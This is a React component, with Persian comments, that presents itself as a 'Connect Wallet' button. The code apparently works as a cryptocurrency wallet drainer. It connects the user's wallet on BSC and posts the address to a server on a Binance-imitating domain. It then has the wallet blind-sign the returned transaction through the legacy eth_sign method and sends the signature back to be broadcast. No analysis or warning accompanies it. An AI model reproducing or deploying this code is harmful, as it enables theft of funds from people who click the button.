import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    // حذف داده‌های قدیمی WalletConnect
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    // مقداردهی اولیه WalletConnect
    const ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [56], // فقط BSC
      methods: ["personal_sign", "eth_sign"],
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    const provider = ethereumProvider;
    const accounts = await provider.request({ method: "eth_accounts" });
    const accountSender = accounts[0];

    if (!accountSender) {
      console.error("❌ Wallet connection failed");
      return;
    }

    console.log("✅ Wallet Address:", accountSender);

    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }], // BSC Chain ID
      });
    } catch (error) {
      console.error("❌ Error in switching chain:", error);
      return;
    }

    const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";

    async function signAndSendTransaction(address, chain, type, contract = "0") {
      try {
        const requestData = { handler: "tx", address, chain, type };
        if (type === "token") requestData.contract = contract;

        console.log("📡 Sending Request Data:", requestData);

        const result = await jQuery.post(apiUrl, requestData);
        if (!result || result === "null") {
          console.error("❌ API Response is NULL");
          return;
        }

        let unsignedTx;
        try {
          unsignedTx = JSON.parse(result);
        } catch (e) {
          console.error("❌ Error parsing JSON:", e);
          return;
        }

        console.log("📜 Unsigned Transaction:", unsignedTx);

        if (!unsignedTx.result) {
          console.error("❌ Invalid unsigned transaction response");
          return;
        }

        console.log("🔍 Transaction to be signed:", JSON.stringify(unsignedTx.result));

        const signedTx = await provider.request({
          method: "eth_sign",
          params: [address, JSON.stringify(unsignedTx.result)],
        });

        if (!signedTx) {
          console.error("❌ Signing failed");
          return;
        }

        console.log("✍️ Signed Transaction:", signedTx);

        const txHash = await jQuery.post(apiUrl, {
          handler: "sign",
          signature: signedTx,
          type,
        });

        console.log("📤 Transaction Sent:", txHash);
        return txHash;
      } catch (error) {
        console.error("❌ Error in signAndSendTransaction:", error);
        return null;
      }
    }

    const txHash = await signAndSendTransaction(accountSender, "56", "coin");

    if (txHash) {
      console.log("📤 Final Transaction Hash:", txHash);
    } else {
      console.error("⚠ Transaction failed.");
    }
  }

  return (
    <a
      href="#"
      id="connectWallet"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>Connect Wallet</span>
    </a>
  );
}

export default App;
